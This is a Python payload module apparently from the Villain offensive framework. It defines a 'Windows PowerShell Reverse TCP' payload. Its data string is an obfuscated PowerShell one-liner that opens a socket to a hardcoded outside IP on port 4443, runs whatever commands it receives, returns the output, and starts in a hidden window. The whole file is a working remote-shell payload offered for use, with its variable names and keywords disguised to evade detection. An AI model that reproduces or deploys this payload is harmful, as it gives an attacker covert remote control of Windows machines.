# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = "StarthProcess $PSHOME\powershell.exe hArgumentList {$bc31af0ddh81fdh4a9ehbce6he3a6770814ae = NewhObject System.Net.Sockets.TCPbc31af0ddh81fdh4a9ehbce6he3a6770814ae('15.206.92.28',4443);$sa26866e5dh77d9h4273h915ah934b77a9de0b =$bc31af0ddh81fdh4a9ehbce6he3a6770814ae.Getsa26866e5dh77d9h4273h915ah934b77a9de0b();[byte[]]$a26866e5dh77d9h4273h915ah934b77a9de0b= 0..65535|%{0};while(($i = $sa26866e5dh77d9h4273h915ah934b77a9de0b.Read($a26866e5dh77d9h4273h915ah934b77a9de0b, 0, $a26866e5dh77d9h4273h915ah934b77a9de0b.Length)) hne 0){;$data = (NewhObject hTypeNameSystem.Text.ASCIIEncoding).GetString($a26866e5dh77d9h4273h915ah934b77a9de0b,0, $i);$sendback = (I"e"x"" $data 2>&1 | OuthString );$sendback2 = $sendback + 'PS ' + (p"w"d"").Path + '> ';$sendbyte = ([text.encoding]::ASCII).Geta26866e5dh77d9h4273h915ah934b77a9de0b($sendback2);$sa26866e5dh77d9h4273h915ah934b77a9de0b.Write($sendbyte,0,$sendbyte.Length);$sa26866e5dh77d9h4273h915ah934b77a9de0b.Flush()};$bc31af0ddh81fdh4a9ehbce6he3a6770814ae.Close()} hWindowStyle Hidden"